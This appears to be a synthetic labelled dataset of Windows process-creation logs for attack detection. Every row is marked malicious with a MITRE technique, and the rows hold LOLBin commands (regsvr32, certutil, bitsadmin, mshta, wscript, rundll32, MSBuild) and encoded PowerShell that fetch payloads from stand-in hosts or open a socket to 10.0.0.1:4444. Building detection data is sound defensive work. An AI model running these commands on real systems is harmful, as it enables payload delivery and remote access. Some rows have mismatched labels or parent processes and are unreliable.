UtcTime,ProcessGuid,ProcessId,Image,CommandLine,ParentImage,ParentCommandLine,ParentProcessId,User,IntegrityLevel,is_malicious,mitre_technique_id,technique_name,label
2024-07-07T04:14:49.112Z,{5CEAD836-BF67-4B19-8D9E-4B68FA4B4A2E},22373,C:\Windows\System32\regsvr32.exe,regsvr32.exe /s /n /u /i:http://evil-payload7957.net/file73.sct scrobj.dll,C:\Windows\System32\cmd.exe,cmd.exe /c,15927,CORP\klee,Medium,1,T1218.010,Regsvr32 Squiblydoo,malicious
2024-07-01T04:05:35.771Z,{C58C3792-EFD4-4B6B-82E9-08F9CC798B7B},1814,C:\Windows\System32\regsvr32.exe,regsvr32.exe /s /n /u /i:http://evil-payload7721.com/drop/file436.sct scrobj.dll,C:\Windows\System32\cmd.exe,cmd.exe /c,46426,CORP\klee,Medium,1,T1218.010,Regsvr32 Squiblydoo,malicious
2024-07-03T22:25:29.791Z,{857B7F7B-C0C6-4F79-9087-76CCD24C60EB},45255,C:\Windows\System32\certutil.exe,certutil.exe -urlcache -f http://apt-infra682.net/module653.exe C:\Users\Public\patch980.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe,50092,CORP\mjones,Medium,1,T1105,Certutil Download,malicious
2024-07-02T01:27:38.266Z,{63E8066A-1F8A-435A-A74C-B149C6CD84AD},10781,C:\Windows\System32\certutil.exe,certutil.exe -encode C:\Users\Public\decoded476.exe C:\Users\Public\encoded439.txt,C:\Windows\System32\cmd.exe,cmd.exe,6836,CORP\klee,Medium,1,T1140,Certutil Base64 Decode,malicious
2024-07-05T12:04:06.570Z,{8173D13D-92F1-4E45-B56D-032DE82BCE0A},4850,C:\Windows\System32\certutil.exe,certutil -decode C:\Users\Public\encoded7782.txt C:\Users\Public\decoded2282.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,cmd.exe,4415,CORP\klee,Medium,1,T1140,Certutil Base64 Decode,malicious
2024-07-01T02:49:51.320Z,{EAA699C6-E43A-419F-A6CF-37B4FD1C8967},22580,C:\Windows\System32\wscript.exe,wscript.exe //e:jscript http://malware-cdn9364.net/script849.js,C:\Windows\System32\cmd.exe,cmd.exe /c,55547,CORP\mjones,Medium,1,T1059.005,WScript Remote Script,malicious
2024-07-03T22:22:22.164Z,{7760E599-4652-4183-8A67-E1815329F658},57042,C:\Windows\System32\cmd.exe,cmd.exe /c powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtADsASQBFAFgAKABbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABzACkAKQA=,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"" /n document12.docm",33809,CORP\agarwal,Medium,1,T1204.002,Office Macro Execution,malicious
2024-07-04T15:11:10.686Z,{CEFF57A5-E2F0-4E55-B719-8EE4AF5CA26D},61468,C:\Windows\System32\regsvr32.exe,regsvr32.exe /s /n /u /i:http://stager3419.top/file55.sct scrobj.dll,C:\Windows\System32\cmd.exe,cmd.exe /c,3825,CORP\jsmith,Medium,1,T1218.010,Regsvr32 Squiblydoo,malicious
2024-07-02T12:35:24.316Z,{17ABD12C-39CC-4316-87F7-DC1D19E05415},42874,C:\Windows\System32\wscript.exe,wscript.exe //e:jscript http://shadow-net355.com/script679.js,C:\Windows\System32\cmd.exe,cmd.exe /c,63815,CORP\jsmith,Medium,1,T1059.005,WScript Remote Script,malicious
2024-07-05T01:06:59.219Z,{FEF77EFE-22F9-4909-8329-DED44479337E},61324,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe /transfer job9572 /download /priority high http://loader-cdn3972.net/svc840.exe C:\Users\Public\update542.exe,C:\Windows\System32\cmd.exe,cmd.exe,34042,CORP\mjones,Medium,1,T1197,BITSAdmin Download,malicious
2024-07-01T18:05:54.619Z,{C01AA391-FABC-4B55-9E44-FB7F0647DE67},9513,C:\Windows\System32\certutil.exe,certutil  -urlcache -split -f http://exploit-kit3604.top/downloads/runtime198.exe C:\Users\Public\update25.exe,C:\Windows\System32\cmd.exe,powershell.exe,25638,CORP\agarwal,Medium,1,T1105,Certutil Download,malicious
2024-07-01T21:37:31.055Z,{00E1CE58-6B44-49A9-9A28-F2DCEDFCD2C4},59359,C:\Windows\System32\regsvr32.exe,regsvr32.exe /s /n /u /i:http://malware-cdn3894.io/file891.sct scrobj.dll,C:\Windows\System32\cmd.exe,cmd.exe /c,29564,CORP\klee,Medium,1,T1218.010,Regsvr32 Squiblydoo,malicious
2024-07-01T01:19:10.720Z,{FAA8EA7D-69AB-4D71-90BB-21F600B0A7B9},31099,C:\Windows\System32\regsvr32.exe,regsvr32 /s /n /u /i:http://phish-host6672.xyz/payloads/file136.sct scrobj.dll,C:\Windows\System32\cmd.exe,cmd.exe /c,57224,CORP\mjones,Medium,1,T1218.010,Regsvr32 Squiblydoo,malicious
2024-07-04T03:29:42.781Z,{6793FAD1-E0C6-49B2-9645-A57ADBBA21EB},36885,C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe,C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe C:\Users\Public\module824.csproj,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe,12835,CORP\mjones,Medium,1,T1127.001,MSBuild Inline Task,malicious
2024-07-02T20:43:38.241Z,{A8875755-7DFD-438D-9B5E-965A226F737D},27598,C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe,C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe C:\Users\Public\svc650.csproj,C:\Windows\System32\cmd.exe,cmd.exe,16629,CORP\mjones,Medium,1,T1127.001,MSBuild Inline Task,malicious
2024-07-02T03:12:21.130Z,{75BEEF3A-A526-4A89-9E77-901B6245A956},3103,C:\Windows\System32\regsvr32.exe,regsvr32 /s /n /u /i:http://c2-server3551.ru/payloads/file183.sct scrobj.dll,C:\Windows\System32\cmd.exe,cmd.exe /c,46364,CORP\mjones,Medium,1,T1218.010,Regsvr32 Squiblydoo,malicious
2024-07-03T19:28:04.503Z,{19650D4D-93EF-4743-9502-0F1DE40F4582},65187,C:\Windows\System32\certutil.exe,certutil.exe -urlcache -f http://exploit-kit4226.org/svc284.exe C:\Users\Public\update392.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,cmd.exe,61855,CORP\mjones,Medium,1,T1105,Certutil Download,malicious
2024-07-06T02:44:14.314Z,{69CE52A6-CDBE-4A03-8E8B-D9C479039E02},9214,C:\Windows\System32\cmd.exe,cmd.exe /c powershell.exe -nop -w hidden -enc QQBkAGQALQBUAHkAcABlACAALQBBAHMAcwBlAG0AYgBsAHkATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4ARAByAGEAdwBpAG4AZwA7ACQAZwA9AFsARAByAGEAdwBpAG4AZwAuAEIAaQB0AG0AYQBwAF0AOgA6AG4AZQB3ACgAJAB1ACkA,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"" /n document91.docm",14752,CORP\mjones,Medium,1,T1204.002,Office Macro Execution,malicious
2024-07-07T02:37:05.932Z,{9FFDACC5-CF89-4047-93D0-ED2CDC8C6D94},46088,C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe,C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe C:\Users\Public\installer100.csproj,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe,5292,CORP\mjones,Medium,1,T1127.001,MSBuild Inline Task,malicious
2024-07-05T20:55:48.552Z,{31C330DB-6CBA-4575-BFAF-7D0CBDF60413},34262,C:\Windows\System32\mshta.exe,mshta.exe http://apt-infra4944.cc/script429.hta,C:\Windows\explorer.exe,cmd.exe,15370,CORP\pchen,Medium,1,T1218.005,Mshta Remote HTA,malicious
2024-07-04T01:29:38.753Z,{F33FD691-42F6-42EB-A860-9415F15A6D11},21447,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe /transfer job2326 /download http://exploit-kit2035.ru/files/svc533.exe C:\Users\Public\loader781.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,cmd.exe,46026,CORP\jsmith,Medium,1,T1197,BITSAdmin Download,malicious
2024-07-02T03:16:55.603Z,{534233A0-9120-4229-A830-A5CB7B970F14},4665,C:\Windows\System32\wscript.exe,wscript.exe //e:jscript http://cobaltstrike6398.xyz/script224.js,C:\Windows\System32\cmd.exe,cmd.exe /c,33136,CORP\agarwal,Medium,1,T1059.005,WScript Remote Script,malicious
2024-07-06T01:59:34.180Z,{287085F1-5E32-4F46-95BC-86C8855E1795},11357,C:\Windows\System32\regsvr32.exe,regsvr32 /s /n /u /i:http://evil-payload5976.top/payloads/file215.sct scrobj.dll,C:\Windows\System32\cmd.exe,cmd.exe /c,52478,CORP\mjones,Medium,1,T1218.010,Regsvr32 Squiblydoo,malicious
2024-07-02T08:25:12.643Z,{E976C1EF-DBCF-45B6-B36E-9A79C39543FA},21024,C:\Windows\System32\certutil.exe,certutil -decode C:\Users\Public\encoded9073.txt C:\Users\Public\decoded5453.exe,C:\Windows\System32\cmd.exe,cmd.exe,21560,CORP\agarwal,Medium,1,T1140,Certutil Base64 Decode,malicious
2024-07-04T02:43:41.469Z,{FBECBB97-9C42-4A92-8BDF-570B742BB35F},6618,C:\Windows\System32\certutil.exe,certutil -decode C:\Users\Public\encoded6953.txt C:\Users\Public\decoded3055.exe,C:\Windows\System32\cmd.exe,powershell.exe,1676,CORP\mjones,Medium,1,T1140,Certutil Base64 Decode,malicious
2024-07-01T15:43:01.995Z,{5449F53D-EE6B-431C-BDBF-27CF16EE8C77},12737,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe /transfer job3881 /download /priority high http://malware-cdn2011.top/loader510.exe C:\Users\Public\core966.exe,C:\Windows\System32\cmd.exe,cmd.exe,26076,CORP\jsmith,Medium,1,T1197,BITSAdmin Download,malicious
2024-07-03T09:52:49.963Z,{D6BE0172-A6C6-472D-8B04-A722E278B089},33223,C:\Windows\System32\wscript.exe,wscript.exe //e:jscript http://darkops2635.ru/script901.js,C:\Windows\System32\cmd.exe,cmd.exe /c,31873,CORP\klee,Medium,1,T1059.005,WScript Remote Script,malicious
2024-07-02T02:48:19.864Z,{207484A9-3281-473A-B346-8E5349B5AAEB},29533,C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe,C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe C:\Users\Public\driver745.csproj,C:\Windows\System32\cmd.exe,cmd.exe,27886,CORP\mjones,Medium,1,T1127.001,MSBuild Inline Task,malicious
2024-07-05T04:25:42.379Z,{E4723FA0-070E-46A1-87C3-AE81CB040527},9666,C:\Windows\System32\certutil.exe,certutil -decode C:\Users\Public\encoded5553.txt C:\Users\Public\decoded3947.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,cmd.exe,64442,CORP\jsmith,Medium,1,T1140,Certutil Base64 Decode,malicious
2024-07-06T03:55:51.237Z,{F12141FB-25A9-4217-94DB-16F9E451D977},55719,C:\Windows\System32\rundll32.exe,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";eval(""window.close"")",C:\Windows\explorer.exe,explorer.exe,63091,CORP\klee,Medium,1,T1218.011,Rundll32 JavaScript,malicious
2024-07-04T20:19:44.371Z,{8D03A306-606A-44BC-8865-383BEB5F5E04},10110,C:\Windows\System32\cmd.exe,cmd.exe /c powershell.exe -nop -w hidden -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAJwAxADAALgAwAC4AMAAuADEAJwAsADQANAA0ADQAKQA7ACQAcwA9ACQAYwAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA=,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"" /n document15.docm",54545,CORP\agarwal,Medium,1,T1204.002,Office Macro Execution,malicious
2024-07-04T03:35:29.727Z,{448B33CD-49BD-47DE-9845-F04037B789E7},38218,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -exec bypass -noni -nop -w hidden -enc SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKABHAGUAdAAtAEMAbwBuAHQAZQBuAHQAIABDADoAXABVAHMAZQByAHMAXABQAHUAYgBsAGkAYwBcAHAAYQB5AGwAbwBhAGQALgBwAHMAMQApAA==,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,WINWORD.EXE /n,50495,CORP\klee,Medium,1,T1059.001,PowerShell Encoded Command,malicious
2024-07-04T10:55:13.533Z,{50A1A84F-1FD3-41DF-B314-ACC3165661D0},63397,C:\Windows\System32\rundll32.exe,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();h=new%20ActiveXObject(""WScript.Shell"").Run(""powershell -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtADsASQBFAFgAKABbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABzACkAKQA="")",C:\Windows\explorer.exe,explorer.exe,42109,CORP\jsmith,Medium,1,T1218.011,Rundll32 JavaScript,malicious
2024-07-04T01:33:42.692Z,{C93E2348-3FB8-4EFC-A13B-432A500E167B},6570,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe /transfer job4861 /download /priority high http://dropper-srv7283.xyz/module418.exe C:\Users\Public\installer194.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,cmd.exe,8813,CORP\mjones,Medium,1,T1197,BITSAdmin Download,malicious
2024-07-03T02:59:37.041Z,{FAACEF10-76D7-4DB0-9DA5-94DB46F280B5},9740,C:\Windows\System32\mshta.exe,mshta.exe http://loader-cdn756.org/script344.hta,C:\Windows\explorer.exe,cmd.exe,7551,CORP\klee,Medium,1,T1218.005,Mshta Remote HTA,malicious
2024-07-03T14:44:57.683Z,{149C2E6C-EA8D-42BA-B400-DE3B079FCE9B},51454,C:\Windows\System32\certutil.exe,certutil.exe -urlcache -f http://apt-infra9284.org/svc713.exe C:\Users\Public\helper260.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,cmd.exe,51470,CORP\jsmith,Medium,1,T1105,Certutil Download,malicious
2024-07-01T01:31:49.148Z,{B49AD7AE-C699-4E3A-8721-03A4326D42EC},63114,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -ep bypass -nop -w hidden -enc SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKABHAGUAdAAtAEMAbwBuAHQAZQBuAHQAIABDADoAXABVAHMAZQByAHMAXABQAHUAYgBsAGkAYwBcAHAAYQB5AGwAbwBhAGQALgBwAHMAMQApAA==,C:\Windows\System32\cmd.exe,WINWORD.EXE /n,31018,CORP\agarwal,Medium,1,T1059.001,PowerShell Encoded Command,malicious
2024-07-01T21:39:10.855Z,{F3BA2609-DA9F-4E72-BF25-67DE896DDFB4},39734,C:\Windows\System32\mshta.exe,"mshta vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"http://evil-payload7730.com/script249.hta"""""")",C:\Windows\explorer.exe,cmd.exe,5191,CORP\jsmith,Medium,1,T1218.005,Mshta Remote HTA,malicious
2024-07-06T04:23:22.463Z,{E816868D-91EB-4E09-862F-197EB76F6FAD},32865,C:\Windows\System32\rundll32.exe,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();new%20ActiveXObject(""WScript.Shell"").Run(""cmd /c svc665.exe"")",C:\Windows\explorer.exe,cmd.exe,33863,CORP\agarwal,Medium,1,T1218.011,Rundll32 JavaScript,malicious
2024-07-02T01:45:31.626Z,{85083010-A14E-4C33-89B9-4A8A184B5E5F},63278,C:\Windows\System32\mshta.exe,"mshta vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"http://stager2089.xyz/script147.hta"""""")",C:\Windows\System32\cmd.exe,explorer.exe,6768,CORP\klee,Medium,1,T1218.005,Mshta Remote HTA,malicious
